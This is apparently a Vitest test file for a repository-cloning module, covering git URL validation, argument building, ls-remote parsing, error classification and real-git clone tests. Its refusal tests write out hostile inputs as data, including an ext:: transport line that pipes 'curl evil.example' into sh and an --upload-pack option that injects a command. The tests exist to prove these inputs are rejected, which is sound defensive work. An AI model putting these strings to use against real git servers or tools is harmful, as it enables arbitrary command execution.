/**
 * @fileoverview Tests for the clone-a-repository-as-a-case core (issue #236).
 *
 * Two halves, mirroring the module:
 *
 * 1. The PURE half — URL parsing (where the security decisions live), argv/env
 *    construction, `ls-remote` parsing and stderr classification. No spawning.
 * 2. The IO half — driven against a REAL `git` cloning a REAL local bare repo, so
 *    the argv, the failure classification and the cleanup-on-failure path are all
 *    proven against git's actual behavior rather than a mock's idea of it. These
 *    skip themselves when git is unavailable (never silently pass: the pure
 *    assertions above still run).
 *
 * Port: N/A (no server).
 */

import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  buildCloneArgs,
  buildLsRemoteArgs,
  classifyGitFailure,
  cloneRepository,
  getActiveGitOperationCount,
  gitNonInteractiveEnv,
  isGitAvailable,
  isSafeGitRef,
  parseGitRepositoryUrl,
  parseLsRemoteOutput,
  probeGitRemote,
  sanitizeGitOutput,
  suggestCaseNameFromRepo,
} from '../src/git-clone.js';

/** Narrow a parse result to the accepted branch, failing loudly otherwise. */
function accepted(input: string) {
  const parsed = parseGitRepositoryUrl(input);
  if (!parsed.cloneable) throw new Error(`expected ${input} to be cloneable, got ${parsed.code}: ${parsed.message}`);
  return parsed;
}

/** Narrow a parse result to the rejected branch. */
function rejected(input: string) {
  const parsed = parseGitRepositoryUrl(input);
  if (parsed.cloneable) throw new Error(`expected ${input} to be REFUSED, but it parsed as ${parsed.repository}`);
  return parsed;
}

describe('parseGitRepositoryUrl', () => {
  it('accepts an https GitHub URL and pulls out owner/repo/provider', () => {
    const parsed = accepted('https://github.com/Ark0N/Codeman.git');
    expect(parsed.transport).toBe('https');
    expect(parsed.host).toBe('github.com');
    expect(parsed.owner).toBe('Ark0N');
    expect(parsed.repo).toBe('Codeman');
    expect(parsed.provider).toBe('GitHub');
    expect(parsed.suggestedName).toBe('Codeman');
    expect(parsed.warnings).toEqual([]);
  });

  it('accepts nested owner paths and a missing .git suffix', () => {
    const parsed = accepted('https://gitlab.com/group/subgroup/project');
    expect(parsed.owner).toBe('group/subgroup');
    expect(parsed.repo).toBe('project');
    expect(parsed.provider).toBe('GitLab');
  });

  it('accepts the scp-like SSH form', () => {
    const parsed = accepted('git@github.com:owner/repo.git');
    expect(parsed.transport).toBe('ssh');
    expect(parsed.host).toBe('github.com');
    expect(parsed.owner).toBe('owner');
    expect(parsed.repo).toBe('repo');
    // The advisory exists because an unconfigured key fails rather than prompts.
    expect(parsed.warnings.join(' ')).toMatch(/ssh keys/i);
  });

  it('accepts ssh:// with a port', () => {
    const parsed = accepted('ssh://git@git.example.com:2222/owner/repo.git');
    expect(parsed.transport).toBe('ssh');
    expect(parsed.host).toBe('git.example.com:2222');
    expect(parsed.repo).toBe('repo');
  });

  it('warns but accepts plain http and git://', () => {
    expect(accepted('http://example.com/owner/repo.git').warnings.join(' ')).toMatch(/unencrypted/i);
    expect(accepted('git://example.com/owner/repo.git').warnings.join(' ')).toMatch(/unauthenticated/i);
  });

  it('accepts an absolute local path and file:// as a local clone', () => {
    expect(accepted('/srv/repos/thing.git').transport).toBe('local');
    expect(accepted('/srv/repos/thing.git').repo).toBe('thing');
    expect(accepted('file:///srv/repos/thing').transport).toBe('local');
  });

  // ── The refusals that matter ──────────────────────────────────────────────

  it('REFUSES ext:: and every other transport helper (arbitrary command execution)', () => {
    expect(rejected('ext::sh -c "curl evil.example | sh"').code).toBe('TRANSPORT_HELPER');
    expect(rejected('fd::7').code).toBe('TRANSPORT_HELPER');
    // Not just the known-bad names: ANY `<helper>::` dispatches to git-remote-<helper>.
    expect(rejected('weird::payload').code).toBe('TRANSPORT_HELPER');
  });

  it('REFUSES an option-shaped operand', () => {
    expect(rejected('--upload-pack=touch /tmp/pwned').code).toBe('OPTION_LIKE');
    expect(rejected('-u whatever').code).toBe('OPTION_LIKE');
  });

  it('REFUSES a URL carrying a password', () => {
    expect(rejected('https://user:token@github.com/owner/repo.git').code).toBe('CREDENTIALS_IN_URL');
  });

  it('REFUSES unsupported schemes', () => {
    expect(rejected('ftp://example.com/repo.git').code).toBe('UNSUPPORTED_TRANSPORT');
    expect(rejected('javascript://example.com/repo.git').code).toBe('UNSUPPORTED_TRANSPORT');
  });

  it('REFUSES control characters and over-long input', () => {
    expect(rejected('https://example.com/repo\n--upload-pack=x').code).toBe('CONTROL_CHARS');
    expect(rejected(`https://example.com/${'a'.repeat(2100)}`).code).toBe('TOO_LONG');
  });

  it('REFUSES relative and ~ paths, and empty input', () => {
    expect(rejected('./repo').code).toBe('BAD_SYNTAX');
    expect(rejected('~/repo').code).toBe('BAD_SYNTAX');
    expect(rejected('   ').code).toBe('EMPTY');
    expect(rejected('not a url at all').code).toBe('BAD_SYNTAX');
  });

  it('REFUSES a URL with no repository name', () => {
    expect(rejected('https://github.com/').code).toBe('NO_REPOSITORY_NAME');
  });

  it('REFUSES a malformed percent-escape as BAD_SYNTAX instead of throwing', () => {
    // `new URL` tolerates "%zz" in a path; decodeURIComponent throws on it,
    // and uncaught that URIError surfaced as a 500 from the route.
    expect(rejected('https://github.com/%zz/repo.git').code).toBe('BAD_SYNTAX');
    expect(rejected('https://github.com/owner/repo%').code).toBe('BAD_SYNTAX');
  });
});

describe('suggestCaseNameFromRepo', () => {
  it('produces names the case-name validator accepts', () => {
    expect(suggestCaseNameFromRepo('My.Repo.git')).toBe('My-Repo');
    expect(suggestCaseNameFromRepo('repo with spaces')).toBe('repo-with-spaces');
    expect(suggestCaseNameFromRepo('--weird--')).toBe('weird');
    for (const input of ['My.Repo.git', 'repo with spaces', 'a/b', 'ünïcodé']) {
      const suggested = suggestCaseNameFromRepo(input);
      if (suggested) expect(suggested).toMatch(/^[a-zA-Z0-9_-]+$/);
    }
  });

  it('returns empty rather than inventing a name when nothing survives', () => {
    expect(suggestCaseNameFromRepo('...')).toBe('');
    expect(suggestCaseNameFromRepo('')).toBe('');
  });
});

describe('isSafeGitRef', () => {
  it('accepts real branch and tag names', () => {
    for (const ref of ['main', 'v1.2.3', 'release/2026-08', 'feat_x', 'v1.0.0+build.5']) {
      expect(isSafeGitRef(ref)).toBe(true);
    }
  });

  it('rejects flags, traversal and revision syntax', () => {
    for (const ref of ['-x', '--upload-pack=x', 'a..b', 'HEAD@{1}', 'x.lock', 'has space', 'trailing/', '']) {
      expect(isSafeGitRef(ref)).toBe(false);
    }
  });
});

describe('buildCloneArgs / buildLsRemoteArgs', () => {
  it('always separates operands with --', () => {
    const args = buildCloneArgs({ repository: 'https://example.com/r.git', destination: '/cases/r' });
    expect(args).toEqual(['clone', '--', 'https://example.com/r.git', '/cases/r']);
    // The operands must sit AFTER the separator, always.
    expect(args.indexOf('--')).toBeLessThan(args.indexOf('https://example.com/r.git'));
    expect(buildLsRemoteArgs('https://example.com/r.git')).toEqual([
      'ls-remote',
      '--symref',
      '--',
      'https://example.com/r.git',
    ]);
  });

  it('maps ref to --branch --single-branch and shallow to --depth 1', () => {
    expect(buildCloneArgs({ repository: 'r', destination: 'd', ref: 'v1', shallow: true })).toEqual([
      'clone',
      '--single-branch',
      '--branch',
      'v1',
      '--depth',
      '1',
      '--',
      'r',
      'd',
    ]);
  });

  it('clears every credential helper, BEFORE the subcommand, only when asked', () => {
    // Multi-user non-admin clones must not borrow the server account's git sign-in.
    // `-c` is a global option: after `clone` git would read it as an unknown flag.
    expect(
      buildCloneArgs({ repository: 'https://example.com/r.git', destination: 'd', withoutCredentialHelpers: true })
    ).toEqual(['-c', 'credential.helper=', 'clone', '--', 'https://example.com/r.git', 'd']);
    expect(buildLsRemoteArgs('https://example.com/r.git', { withoutCredentialHelpers: true })).toEqual([
      '-c',
      'credential.helper=',
      'ls-remote',
      '--symref',
      '--',
      'https://example.com/r.git',
    ]);
    // Absent or false leaves the argv exactly as it was before the option existed.
    expect(buildCloneArgs({ repository: 'r', destination: 'd', withoutCredentialHelpers: false })[0]).toBe('clone');
    expect(buildLsRemoteArgs('r', {})[0]).toBe('ls-remote');
  });
});

describe('gitNonInteractiveEnv', () => {
  it('closes every interactive path that could hang an open request', () => {
    const env = gitNonInteractiveEnv({ PATH: '/usr/bin', HOME: '/home/x' });
    expect(env.GIT_TERMINAL_PROMPT).toBe('0');
    expect(env.GIT_ASKPASS).toBe('');
    expect(env.SSH_ASKPASS_REQUIRE).toBe('never');
    expect(env.DISPLAY).toBe('');
    expect(env.GCM_INTERACTIVE).toBe('never');
    expect(env.GIT_SSH_COMMAND).toContain('BatchMode=yes');
    // HOME/PATH are inherited on purpose: a working ssh agent keeps working.
    expect(env.HOME).toBe('/home/x');
    expect(env.PATH).toBe('/usr/bin');
  });

  it("does not override a user's own GIT_SSH_COMMAND", () => {
    expect(gitNonInteractiveEnv({ GIT_SSH_COMMAND: 'ssh -F /custom' }).GIT_SSH_COMMAND).toBe('ssh -F /custom');
  });
});

describe('parseLsRemoteOutput', () => {
  it('extracts the default branch, branches and tags, dropping peeled tags', () => {
    const parsed = parseLsRemoteOutput(
      [
        'ref: refs/heads/master\tHEAD',
        'b1614e89fcfad61f23052879544b60560a7499cf\tHEAD',
        'b1614e89fcfad61f23052879544b60560a7499cf\trefs/heads/master',
        '498e0545de2edd7a7b412861060580da03fad881\trefs/heads/feat/x',
        '7c3688467ed65a84e91014f58058823471c69359\trefs/tags/v1.0.0',
        '7c3688467ed65a84e91014f58058823471c69359\trefs/tags/v1.0.0^{}',
        '085f4acb606afa75d311dcabfb397d802ed147b4\trefs/pull/1/head',
        '',
      ].join('\n')
    );
    expect(parsed.defaultBranch).toBe('master');
    expect(parsed.branches).toEqual(['master', 'feat/x']);
    expect(parsed.tags).toEqual(['v1.0.0']);
    expect(parsed.truncated).toBe(false);
  });

  it('survives a remote with no HEAD symref', () => {
    const parsed = parseLsRemoteOutput('0ae798f372995b5108796f089d0dcc25df6d40ba\trefs/heads/main');
    expect(parsed.defaultBranch).toBeUndefined();
    expect(parsed.branches).toEqual(['main']);
  });
});

describe('classifyGitFailure', () => {
  it('reports a missing git binary', () => {
    expect(classifyGitFailure('', false, 'Error: spawn git ENOENT').code).toBe('GIT_MISSING');
  });

  it('reports a timeout before looking at stderr', () => {
    expect(classifyGitFailure('fatal: repository not found', true).code).toBe('TIMEOUT');
  });

  it('recognizes the authentication wall in its several dialects', () => {
    for (const stderr of [
      "fatal: could not read Username for 'https://github.com': terminal prompts disabled",
      'remote: Invalid username or password.',
      'git@github.com: Permission denied (publickey).',
    ]) {
      expect(classifyGitFailure(stderr, false).code).toBe('AUTH_REQUIRED');
    }
  });

  it('says "not found OR private" rather than just "not found"', () => {
    const failure = classifyGitFailure("remote: Repository not found.\nfatal: repository 'x' not found", false);
    expect(failure.code).toBe('NOT_FOUND');
    expect(failure.message).toMatch(/private/i);
  });

  it('recognizes a missing ref and an unreachable host', () => {
    expect(classifyGitFailure('fatal: Remote branch nope not found in upstream origin', false).code).toBe(
      'REF_NOT_FOUND'
    );
    expect(classifyGitFailure('fatal: unable to access: Could not resolve host: nope.invalid', false).code).toBe(
      'HOST_UNREACHABLE'
    );
  });
});

describe('sanitizeGitOutput', () => {
  it('redacts credentials a helper may have echoed back', () => {
    expect(sanitizeGitOutput("fatal: unable to access 'https://bob:ghp_secret@github.com/x.git/'")).toBe(
      "fatal: unable to access 'https://***:***@github.com/x.git/'"
    );
  });

  it('strips control bytes and keeps the TAIL when over budget', () => {
    expect(sanitizeGitOutput('a b[31mc')).toBe('ab[31mc');
    const long = sanitizeGitOutput(`${'x'.repeat(50)}THE-END`, 10);
    expect(long.startsWith('…')).toBe(true);
    expect(long.endsWith('THE-END')).toBe(true);
  });
});

// ─── Real git, real local repository ─────────────────────────────────────────

const gitPresent = isGitAvailable();

describe.skipIf(!gitPresent)('cloneRepository / probeGitRemote (real git)', () => {
  let root: string;
  let origin: string;

  const git = (args: string[], cwd: string) =>
    execFileSync('git', args, { cwd, encoding: 'utf-8', stdio: ['ignore', 'pipe', 'pipe'] });

  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), 'codeman-clone-test-'));
    origin = join(root, 'origin.git');
    mkdirSync(origin);
    git(['init', '--bare', '--quiet'], origin);

    const work = join(root, 'work');
    mkdirSync(work);
    git(['init', '--quiet'], work);
    git(['config', 'user.email', 'test@example.com'], work);
    git(['config', 'user.name', 'Codeman Test'], work);
    writeFileSync(join(work, 'README.md'), '# fixture\n');
    git(['add', 'README.md'], work);
    git(['commit', '--quiet', '-m', 'initial'], work);
    git(['branch', '-M', 'main'], work);
    git(['tag', 'v1'], work);
    git(['checkout', '--quiet', '-b', 'side'], work);
    writeFileSync(join(work, 'SIDE.md'), 'side\n');
    git(['add', 'SIDE.md'], work);
    git(['commit', '--quiet', '-m', 'side'], work);
    git(['checkout', '--quiet', 'main'], work);
    git(['remote', 'add', 'origin', origin], work);
    git(['push', '--quiet', 'origin', 'main', 'side', '--tags'], work);
    // Give the bare repo a HEAD that resolves, so --symref has something to say.
    git(['symbolic-ref', 'HEAD', 'refs/heads/main'], origin);
  });

  afterAll(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('probes a reachable remote for its default branch, branches and tags', async () => {
    const probe = await probeGitRemote(origin);
    expect(probe.reachable).toBe(true);
    expect(probe.defaultBranch).toBe('main');
    expect(probe.branches.sort()).toEqual(['main', 'side']);
    expect(probe.tags).toEqual(['v1']);
  });

  it('reports an unreachable remote as a normal answer, not a throw', async () => {
    const probe = await probeGitRemote(join(root, 'does-not-exist.git'));
    expect(probe.reachable).toBe(false);
    expect(probe.failure?.code).toBe('NOT_FOUND');
    expect(probe.branches).toEqual([]);
  });

  it('clones into a fresh destination', async () => {
    const dest = join(root, 'clone-plain');
    const result = await cloneRepository({ repository: origin, destination: dest });
    expect(result.ok).toBe(true);
    expect(existsSync(join(dest, 'README.md'))).toBe(true);
    expect(existsSync(join(dest, '.git'))).toBe(true);
  });

  it('clones a single branch when a ref is given', async () => {
    const dest = join(root, 'clone-side');
    const result = await cloneRepository({ repository: origin, destination: dest, ref: 'side' });
    expect(result.ok).toBe(true);
    expect(existsSync(join(dest, 'SIDE.md'))).toBe(true);
  });

  it('clones a tag, shallow', async () => {
    const dest = join(root, 'clone-tag');
    const result = await cloneRepository({ repository: origin, destination: dest, ref: 'v1', shallow: true });
    expect(result.ok).toBe(true);
    expect(existsSync(join(dest, 'README.md'))).toBe(true);
    expect(existsSync(join(dest, 'SIDE.md'))).toBe(false);
  });

  it('removes the destination it created when the clone fails', async () => {
    const dest = join(root, 'clone-bad-ref');
    const result = await cloneRepository({ repository: origin, destination: dest, ref: 'no-such-branch' });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.failure.code).toBe('REF_NOT_FOUND');
    // The half-written tree must not survive as a phantom case directory,
    // and neither may the attempt-owned temp directory it cloned into.
    expect(existsSync(dest)).toBe(false);
    expect(readdirSync(root).filter((n) => n.includes('.cloning-'))).toEqual([]);
  });

  it('lets two concurrent clones of the SAME destination race safely', async () => {
    // Both used to pass the existence check; the loser's cleanup then DELETED
    // the winner's finished tree. Now each attempt clones into its own temp
    // sibling and an atomic rename decides the winner.
    const dest = join(root, 'clone-race');
    const results = await Promise.all([
      cloneRepository({ repository: origin, destination: dest }),
      cloneRepository({ repository: origin, destination: dest }),
    ]);
    expect(results.filter((r) => r.ok)).toHaveLength(1);
    const loser = results.find((r) => !r.ok);
    if (loser && !loser.ok) expect(loser.failure.code).toBe('DESTINATION_EXISTS');
    // The winner's tree survives the loser's cleanup intact...
    expect(existsSync(join(dest, 'README.md'))).toBe(true);
    expect(existsSync(join(dest, '.git'))).toBe(true);
    // ...and neither attempt leaves its temp directory behind.
    expect(readdirSync(root).filter((n) => n.includes('.cloning-'))).toEqual([]);
  });

  it('refuses a destination that already exists instead of cloning into it', async () => {
    const dest = join(root, 'occupied');
    mkdirSync(dest);
    writeFileSync(join(dest, 'keep.txt'), 'precious\n');
    const result = await cloneRepository({ repository: origin, destination: dest });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.failure.code).toBe('DESTINATION_EXISTS');
    // And the pre-existing directory is left completely alone.
    expect(existsSync(join(dest, 'keep.txt'))).toBe(true);
  });

  it('rejects an unsafe ref without spawning git', async () => {
    const result = await cloneRepository({
      repository: origin,
      destination: join(root, 'never'),
      ref: '--upload-pack=x',
    });
    expect(result.ok).toBe(false);
    expect(existsSync(join(root, 'never'))).toBe(false);
  });

  it('releases every concurrency slot it took', async () => {
    await Promise.all([probeGitRemote(origin), probeGitRemote(origin), probeGitRemote(origin), probeGitRemote(origin)]);
    // A leaked slot would eventually wedge every future clone behind a full pool.
    expect(getActiveGitOperationCount()).toBe(0);
  });

  it('times out instead of hanging forever', async () => {
    // 1ms budget: git cannot finish, so the SIGTERM/SIGKILL escalation is what ends it.
    const result = await cloneRepository({
      repository: origin,
      destination: join(root, 'clone-timeout'),
      timeoutMs: 1,
    });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.failure.code).toBe('TIMEOUT');
    expect(existsSync(join(root, 'clone-timeout'))).toBe(false);
    expect(readdirSync(root).filter((n) => n.includes('.cloning-'))).toEqual([]);
  });
});

// ─── Pool bounds, driven with a fake `git` that sleeps ──────────────────────
//
// A fresh module instance (vi.resetModules + dynamic import) picks up the
// 1-slot/1-waiter env config, and a PATH-shimmed `git` that answers --version
// then sleeps lets one operation HOLD the slot deterministically with no
// network. Placed after the real-git suite so the PATH shim never leaks into it.
describe('git pool queue bounds (fake git)', () => {
  let fakeDir: string;
  let savedPath: string | undefined;
  let mod: typeof import('../src/git-clone.js');

  beforeAll(async () => {
    fakeDir = mkdtempSync(join(tmpdir(), 'codeman-fake-git-'));
    writeFileSync(
      join(fakeDir, 'git'),
      '#!/bin/sh\nif [ "$1" = "--version" ]; then echo "git version 2.43.0"; exit 0; fi\nsleep 30\n',
      { mode: 0o755 }
    );
    savedPath = process.env.PATH;
    process.env.PATH = `${fakeDir}:${savedPath}`;
    process.env.CODEMAN_MAX_GIT_OPERATIONS = '1';
    process.env.CODEMAN_MAX_GIT_QUEUE = '1';
    vi.resetModules();
    mod = await import('../src/git-clone.js');
  });

  afterAll(() => {
    process.env.PATH = savedPath;
    delete process.env.CODEMAN_MAX_GIT_OPERATIONS;
    delete process.env.CODEMAN_MAX_GIT_QUEUE;
    rmSync(fakeDir, { recursive: true, force: true });
    vi.resetModules();
  });

  it('bounds the queue with BUSY and counts queue time against the deadline', async () => {
    // Occupies the single slot: the fake git sleeps far past its 3s budget.
    const holder = mod.probeGitRemote('https://pool.invalid/repo.git', 3_000);
    await new Promise((r) => setTimeout(r, 100));

    // Fills the single queue seat; its 300ms deadline must elapse IN the queue.
    const queued = mod.probeGitRemote('https://pool.invalid/repo.git', 300);
    await new Promise((r) => setTimeout(r, 50));

    // Queue full: answered BUSY immediately, without waiting out its own 5s budget.
    const before = Date.now();
    const overflow = await mod.probeGitRemote('https://pool.invalid/repo.git', 5_000);
    expect(Date.now() - before).toBeLessThan(1_000);
    expect(overflow.reachable).toBe(false);
    expect(overflow.failure?.code).toBe('BUSY');

    // The queued waiter timed out WITHOUT ever spawning git (slot never freed).
    const queuedResult = await queued;
    expect(queuedResult.reachable).toBe(false);
    expect(queuedResult.failure?.code).toBe('TIMEOUT');

    // The slot holder is killed by its own deadline, and nothing leaks.
    const holderResult = await holder;
    expect(holderResult.failure?.code).toBe('TIMEOUT');
    expect(mod.getActiveGitOperationCount()).toBe(0);
    expect(mod.getQueuedGitOperationCount()).toBe(0);
  });
});

describe('isGitAvailable', () => {
  it('answers consistently (memoized)', () => {
    expect(isGitAvailable()).toBe(gitPresent);
    expect(isGitAvailable()).toBe(gitPresent);
  });
});
